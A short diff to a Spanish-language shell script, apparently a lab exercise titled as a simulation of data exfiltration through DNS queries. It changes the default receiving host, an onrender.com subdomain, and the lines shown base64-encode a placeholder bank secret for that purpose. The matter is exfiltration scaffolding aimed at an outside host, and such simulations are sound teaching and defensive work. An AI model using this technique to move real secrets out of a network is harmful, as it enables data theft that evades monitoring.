@@ -2,7 +2,7 @@
 
 DATOS_SENSIBLES="clave_secreta_banco_2026"
 DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')
-HOST="${TARGET_HOST:-servidor-web-dmz-asaumeth.onrender.com}"
+HOST="${TARGET_HOST:-servidor-web-dmz-adrianysmaria.onrender.com}"
 
 echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
 echo "Dato original: $DATOS_SENSIBLES"
